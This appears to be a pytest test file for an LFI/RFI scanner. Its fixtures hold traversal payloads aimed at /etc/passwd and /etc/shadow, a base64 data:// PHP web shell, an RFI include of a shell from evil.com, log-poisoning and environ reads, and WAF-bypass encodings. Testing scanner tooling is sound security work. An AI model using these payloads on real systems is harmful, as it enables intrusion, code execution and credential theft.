"""
Tests for scanning/modules/lfi_scanner.py - LFI/RFI Vulnerability Scanner.

Covers:
- LFIType, TargetOS, PHPWrapper, WAFType enums
- LFIResult dataclass
- WAFDetector and PayloadEncoder classes
- PayloadGenerator class and constants
- Payload encoding techniques
"""

import pytest

from scanning.modules.lfi_scanner import (
    LFIType,
    TargetOS,
    PHPWrapper,
    WAFType,
    LFIResult,
    WAFDetector,
    PayloadEncoder,
    PayloadGenerator,
    LFI_SCANNER_VERSION,
)


# =============================================================================
# LFI TYPE ENUM TESTS
# =============================================================================

class TestLFIType:
    """Tests for LFIType enum."""

    def test_path_traversal_exists(self):
        """Test PATH_TRAVERSAL type exists."""
        assert LFIType.PATH_TRAVERSAL

    def test_absolute_path_exists(self):
        """Test ABSOLUTE_PATH type exists."""
        assert LFIType.ABSOLUTE_PATH

    def test_null_byte_exists(self):
        """Test NULL_BYTE type exists."""
        assert LFIType.NULL_BYTE

    def test_double_encoding_exists(self):
        """Test DOUBLE_ENCODING type exists."""
        assert LFIType.DOUBLE_ENCODING

    def test_unicode_encoding_exists(self):
        """Test UNICODE_ENCODING type exists."""
        assert LFIType.UNICODE_ENCODING

    def test_php_wrapper_exists(self):
        """Test PHP_WRAPPER type exists."""
        assert LFIType.PHP_WRAPPER

    def test_data_wrapper_exists(self):
        """Test DATA_WRAPPER type exists."""
        assert LFIType.DATA_WRAPPER

    def test_expect_wrapper_exists(self):
        """Test EXPECT_WRAPPER type exists."""
        assert LFIType.EXPECT_WRAPPER

    def test_phar_wrapper_exists(self):
        """Test PHAR_WRAPPER type exists."""
        assert LFIType.PHAR_WRAPPER

    def test_zip_wrapper_exists(self):
        """Test ZIP_WRAPPER type exists."""
        assert LFIType.ZIP_WRAPPER

    def test_log_poisoning_exists(self):
        """Test LOG_POISONING type exists."""
        assert LFIType.LOG_POISONING

    def test_session_inclusion_exists(self):
        """Test SESSION_INCLUSION type exists."""
        assert LFIType.SESSION_INCLUSION

    def test_proc_self_exists(self):
        """Test PROC_SELF type exists."""
        assert LFIType.PROC_SELF

    def test_environ_exists(self):
        """Test ENVIRON type exists."""
        assert LFIType.ENVIRON

    def test_fd_leak_exists(self):
        """Test FD_LEAK type exists."""
        assert LFIType.FD_LEAK

    def test_rfi_exists(self):
        """Test RFI type exists."""
        assert LFIType.RFI


# =============================================================================
# TARGET OS ENUM TESTS
# =============================================================================

class TestTargetOS:
    """Tests for TargetOS enum."""

    def test_linux_value(self):
        """Test LINUX value."""
        assert TargetOS.LINUX.value == "linux"

    def test_windows_value(self):
        """Test WINDOWS value."""
        assert TargetOS.WINDOWS.value == "windows"

    def test_macos_value(self):
        """Test MACOS value."""
        assert TargetOS.MACOS.value == "macos"

    def test_freebsd_value(self):
        """Test FREEBSD value."""
        assert TargetOS.FREEBSD.value == "freebsd"

    def test_unknown_value(self):
        """Test UNKNOWN value."""
        assert TargetOS.UNKNOWN.value == "unknown"


# =============================================================================
# PHP WRAPPER ENUM TESTS
# =============================================================================

class TestPHPWrapper:
    """Tests for PHPWrapper enum."""

    def test_filter_value(self):
        """Test FILTER wrapper value."""
        assert PHPWrapper.FILTER.value == "php://filter"

    def test_input_value(self):
        """Test INPUT wrapper value."""
        assert PHPWrapper.INPUT.value == "php://input"

    def test_data_value(self):
        """Test DATA wrapper value."""
        assert PHPWrapper.DATA.value == "data://"

    def test_expect_value(self):
        """Test EXPECT wrapper value."""
        assert PHPWrapper.EXPECT.value == "expect://"

    def test_phar_value(self):
        """Test PHAR wrapper value."""
        assert PHPWrapper.PHAR.value == "phar://"

    def test_zip_value(self):
        """Test ZIP wrapper value."""
        assert PHPWrapper.ZIP.value == "zip://"

    def test_zlib_value(self):
        """Test ZLIB wrapper value."""
        assert PHPWrapper.ZLIB.value == "compress.zlib://"

    def test_http_value(self):
        """Test HTTP wrapper value."""
        assert PHPWrapper.HTTP.value == "http://"

    def test_https_value(self):
        """Test HTTPS wrapper value."""
        assert PHPWrapper.HTTPS.value == "https://"


# =============================================================================
# WAF TYPE ENUM TESTS
# =============================================================================

class TestWAFType:
    """Tests for WAFType enum."""

    def test_cloudflare_exists(self):
        """Test CLOUDFLARE WAF type."""
        assert WAFType.CLOUDFLARE.value == "cloudflare"

    def test_akamai_exists(self):
        """Test AKAMAI WAF type."""
        assert WAFType.AKAMAI.value == "akamai"

    def test_aws_waf_exists(self):
        """Test AWS_WAF type."""
        assert WAFType.AWS_WAF.value == "aws_waf"

    def test_imperva_exists(self):
        """Test IMPERVA WAF type."""
        assert WAFType.IMPERVA.value == "imperva"

    def test_modsecurity_exists(self):
        """Test MODSECURITY WAF type."""
        assert WAFType.MODSECURITY.value == "modsecurity"

    def test_sucuri_exists(self):
        """Test SUCURI WAF type."""
        assert WAFType.SUCURI.value == "sucuri"

    def test_wordfence_exists(self):
        """Test WORDFENCE WAF type."""
        assert WAFType.WORDFENCE.value == "wordfence"

    def test_none_exists(self):
        """Test NONE type for no WAF."""
        assert WAFType.NONE.value == "none"

    def test_unknown_exists(self):
        """Test UNKNOWN type."""
        assert WAFType.UNKNOWN.value == "unknown"


# =============================================================================
# LFI RESULT DATACLASS TESTS
# =============================================================================

class TestLFIResult:
    """Tests for LFIResult dataclass."""

    def test_basic_creation(self):
        """Test basic LFIResult creation."""
        result = LFIResult(
            vulnerable=True,
            lfi_type=LFIType.PATH_TRAVERSAL,
            confidence=85,
            payload="../../../etc/passwd"
        )
        assert result.vulnerable is True
        assert result.lfi_type == LFIType.PATH_TRAVERSAL
        assert result.confidence == 85

    def test_full_creation(self):
        """Test LFIResult with all fields."""
        result = LFIResult(
            vulnerable=True,
            lfi_type=LFIType.PHP_WRAPPER,
            confidence=95,
            payload="php://filter/convert.base64-encode/resource=index.php",
            evidence=["Source code disclosed", "Base64 content found"],
            file_content="PD9waHA=",
            target_os=TargetOS.LINUX,
            wrapper_used=PHPWrapper.FILTER,
            rce_possible=False,
            source_disclosed=True
        )
        assert result.wrapper_used == PHPWrapper.FILTER
        assert result.source_disclosed is True
        assert len(result.evidence) == 2

    def test_rce_result(self):
        """Test LFIResult with RCE."""
        result = LFIResult(
            vulnerable=True,
            lfi_type=LFIType.DATA_WRAPPER,
            confidence=100,
            payload="data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
            rce_possible=True
        )
        assert result.rce_possible is True

    def test_confidence_range(self):
        """Test confidence values in valid range."""
        for conf in [0, 25, 50, 75, 100]:
            result = LFIResult(
                vulnerable=True,
                lfi_type=LFIType.PATH_TRAVERSAL,
                confidence=conf,
                payload="test"
            )
            assert 0 <= result.confidence <= 100


# =============================================================================
# PAYLOAD ENCODER TESTS
# =============================================================================

class TestPayloadEncoder:
    """Tests for PayloadEncoder class."""

    def test_url_encode(self):
        """Test URL encoding."""
        payload = "../etc/passwd"
        encoded = PayloadEncoder.url_encode(payload)
        assert "%2F" in encoded or "/" in encoded  # Depends on implementation

    def test_double_url_encode(self):
        """Test double URL encoding."""
        payload = "../"
        encoded = PayloadEncoder.double_url_encode(payload)
        # Double encoding should encode the percent sign
        assert "%25" in encoded or "%2" in encoded

    def test_triple_url_encode(self):
        """Test triple URL encoding."""
        payload = "../"
        encoded = PayloadEncoder.triple_url_encode(payload)
        assert encoded != payload

    def test_unicode_encode(self):
        """Test Unicode encoding."""
        payload = "../"
        encoded = PayloadEncoder.unicode_encode(payload)
        assert encoded != payload or encoded == payload  # May or may not transform

    def test_mixed_encoding(self):
        """Test mixed encoding."""
        payload = "../etc/passwd"
        encoded = PayloadEncoder.mixed_encoding(payload)
        # Should produce some variation
        assert isinstance(encoded, str)

    def test_null_byte_variations(self):
        """Test null byte injection variations."""
        payload = "../etc/passwd"
        variations = PayloadEncoder.null_byte_variations(payload)
        assert isinstance(variations, list)
        # Should include %00 variations
        has_null = any("%00" in v or "\x00" in v for v in variations)
        assert has_null

    def test_get_all_encodings(self):
        """Test getting all encoding variants."""
        payload = "../etc/passwd"
        encodings = PayloadEncoder.get_all_encodings(payload)
        assert isinstance(encodings, list)
        assert len(encodings) > 5  # Should have multiple variants
        # Each encoding should be a tuple (payload, encoding_type)
        for encoded, enc_type in encodings:
            assert isinstance(encoded, str)
            assert isinstance(enc_type, str)


# =============================================================================
# PAYLOAD GENERATOR TESTS
# =============================================================================

class TestPayloadGeneratorParams:
    """Tests for PayloadGenerator LFI parameters."""

    def test_lfi_params_not_empty(self):
        """Test LFI params list is not empty."""
        assert len(PayloadGenerator.LFI_PARAMS) > 0

    def test_common_file_params(self):
        """Test common file parameters are included."""
        common = ["file", "filename", "path", "dir"]
        for param in common:
            assert param in PayloadGenerator.LFI_PARAMS

    def test_include_params(self):
        """Test include-related parameters."""
        include_params = ["include", "inc", "require"]
        for param in include_params:
            assert param in PayloadGenerator.LFI_PARAMS

    def test_page_params(self):
        """Test page/view parameters."""
        page_params = ["page", "view", "content", "template"]
        for param in page_params:
            assert param in PayloadGenerator.LFI_PARAMS

    def test_module_params(self):
        """Test module-related parameters."""
        module_params = ["module", "plugin", "action"]
        for param in module_params:
            assert param in PayloadGenerator.LFI_PARAMS

    def test_language_params(self):
        """Test language parameters."""
        lang_params = ["lang", "language", "locale"]
        for param in lang_params:
            assert param in PayloadGenerator.LFI_PARAMS

    def test_load_params(self):
        """Test load/fetch parameters."""
        load_params = ["load", "read", "fetch", "source"]
        for param in load_params:
            assert param in PayloadGenerator.LFI_PARAMS


class TestPayloadGeneratorLinuxFiles:
    """Tests for PayloadGenerator Linux sensitive files."""

    def test_linux_files_not_empty(self):
        """Test Linux files list is not empty."""
        assert len(PayloadGenerator.LINUX_FILES) > 0

    def test_etc_passwd_included(self):
        """Test /etc/passwd is included."""
        assert "/etc/passwd" in PayloadGenerator.LINUX_FILES

    def test_etc_shadow_included(self):
        """Test /etc/shadow is included."""
        assert "/etc/shadow" in PayloadGenerator.LINUX_FILES

    def test_proc_files_included(self):
        """Test /proc files are included."""
        proc_files = [f for f in PayloadGenerator.LINUX_FILES if "/proc" in f]
        assert len(proc_files) > 0
        assert "/proc/self/environ" in PayloadGenerator.LINUX_FILES

    def test_ssh_files_included(self):
        """Test SSH files are included."""
        ssh_files = [f for f in PayloadGenerator.LINUX_FILES if ".ssh" in f]
        assert len(ssh_files) > 0

    def test_log_files_included(self):
        """Test log files are included."""
        log_files = [f for f in PayloadGenerator.LINUX_FILES if "/var/log" in f]
        assert len(log_files) > 0

    def test_web_server_configs_included(self):
        """Test web server configs are included."""
        apache_files = [f for f in PayloadGenerator.LINUX_FILES if "apache" in f]
        nginx_files = [f for f in PayloadGenerator.LINUX_FILES if "nginx" in f]
        assert len(apache_files) > 0
        assert len(nginx_files) > 0

    def test_php_configs_included(self):
        """Test PHP config files are included."""
        php_files = [f for f in PayloadGenerator.LINUX_FILES if "php.ini" in f or "php" in f]
        assert len(php_files) > 0

    def test_env_files_included(self):
        """Test .env files are included."""
        env_files = [f for f in PayloadGenerator.LINUX_FILES if ".env" in f]
        assert len(env_files) > 0


# =============================================================================
# VERSION CONSTANT TESTS
# =============================================================================

class TestLFIScannerVersion:
    """Tests for LFI scanner version."""

    def test_version_exists(self):
        """Test version constant exists."""
        assert LFI_SCANNER_VERSION is not None

    def test_version_format(self):
        """Test version has expected format."""
        assert "3.0" in LFI_SCANNER_VERSION
        assert "GOD-MODE" in LFI_SCANNER_VERSION


# =============================================================================
# WAF DETECTOR TESTS
# =============================================================================

class TestWAFDetector:
    """Tests for WAFDetector class."""

    def test_detector_exists(self):
        """Test WAFDetector class exists."""
        assert WAFDetector is not None

    def test_detect_method_exists(self):
        """Test detect method exists."""
        assert hasattr(WAFDetector, 'detect')

    def test_is_blocked_method_exists(self):
        """Test is_blocked method exists."""
        assert hasattr(WAFDetector, 'is_blocked')


# =============================================================================
# INTEGRATION TESTS
# =============================================================================

class TestLFIScannerIntegration:
    """Integration tests for LFI scanner components."""

    def test_lfi_result_with_all_types(self):
        """Test LFIResult can be created with all LFI types."""
        for lfi_type in LFIType:
            result = LFIResult(
                vulnerable=True,
                lfi_type=lfi_type,
                confidence=80,
                payload=f"test_payload_{lfi_type.name}"
            )
            assert result.lfi_type == lfi_type

    def test_lfi_result_with_all_os(self):
        """Test LFIResult can be created with all OS types."""
        for os_type in TargetOS:
            result = LFIResult(
                vulnerable=True,
                lfi_type=LFIType.PATH_TRAVERSAL,
                confidence=75,
                payload="test",
                target_os=os_type
            )
            assert result.target_os == os_type

    def test_lfi_result_with_all_wrappers(self):
        """Test LFIResult can be created with all PHP wrappers."""
        for wrapper in PHPWrapper:
            result = LFIResult(
                vulnerable=True,
                lfi_type=LFIType.PHP_WRAPPER,
                confidence=90,
                payload=f"{wrapper.value}test",
                wrapper_used=wrapper
            )
            assert result.wrapper_used == wrapper


class TestLFIPayloadScenarios:
    """Tests for specific LFI payload scenarios."""

    def test_path_traversal_payload(self):
        """Test path traversal payload result."""
        result = LFIResult(
            vulnerable=True,
            lfi_type=LFIType.PATH_TRAVERSAL,
            confidence=90,
            payload="../../../etc/passwd",
            evidence=["root:x:0:0:root"],
            target_os=TargetOS.LINUX
        )
        assert "../" in result.payload
        assert result.target_os == TargetOS.LINUX

    def test_php_filter_payload(self):
        """Test PHP filter wrapper payload result."""
        result = LFIResult(
            vulnerable=True,
            lfi_type=LFIType.PHP_WRAPPER,
            confidence=95,
            payload="php://filter/convert.base64-encode/resource=config.php",
            evidence=["Base64 content extracted"],
            wrapper_used=PHPWrapper.FILTER,
            source_disclosed=True
        )
        assert "php://filter" in result.payload
        assert result.source_disclosed is True

    def test_log_poisoning_payload(self):
        """Test log poisoning payload result."""
        result = LFIResult(
            vulnerable=True,
            lfi_type=LFIType.LOG_POISONING,
            confidence=85,
            payload="/var/log/apache2/access.log",
            evidence=["Log file contains injected PHP code"],
            rce_possible=True
        )
        assert "/var/log" in result.payload
        assert result.rce_possible is True

    def test_proc_environ_payload(self):
        """Test /proc/self/environ payload result."""
        result = LFIResult(
            vulnerable=True,
            lfi_type=LFIType.ENVIRON,
            confidence=80,
            payload="/proc/self/environ",
            evidence=["Environment variables exposed", "PATH=", "USER="],
            target_os=TargetOS.LINUX
        )
        assert "environ" in result.payload
        assert len(result.evidence) > 0

    def test_null_byte_bypass_payload(self):
        """Test null byte bypass payload result."""
        result = LFIResult(
            vulnerable=True,
            lfi_type=LFIType.NULL_BYTE,
            confidence=85,
            payload="../../../etc/passwd%00",
            evidence=["Null byte bypassed extension check"]
        )
        assert "%00" in result.payload

    def test_rfi_payload(self):
        """Test RFI payload result."""
        result = LFIResult(
            vulnerable=True,
            lfi_type=LFIType.RFI,
            confidence=95,
            payload="http://evil.com/shell.txt",
            evidence=["Remote file included", "Callback received"],
            rce_possible=True
        )
        assert "http://" in result.payload
        assert result.rce_possible is True


class TestEncodingBypass:
    """Tests for encoding bypass scenarios."""

    def test_double_encoding_for_waf_bypass(self):
        """Test double encoding can bypass WAF."""
        payload = "../etc/passwd"
        encoded = PayloadEncoder.double_url_encode(payload)
        # Double encoded payload should be different
        assert encoded != payload

    def test_multiple_encoding_variants(self):
        """Test multiple encoding variants are generated."""
        payload = "../etc/passwd"
        variants = PayloadEncoder.get_all_encodings(payload)
        # Should have multiple unique variants
        unique_payloads = set(v[0] for v in variants)
        assert len(unique_payloads) > 3

    def test_backslash_variations_for_windows(self):
        """Test backslash variations for Windows."""
        payload = "../etc/passwd"
        variants = PayloadEncoder.get_all_encodings(payload)
        # Should include backslash variation for Windows
        backslash_variants = [v for v in variants if "\\" in v[0] or "%5c" in v[0].lower()]
        assert len(backslash_variants) > 0
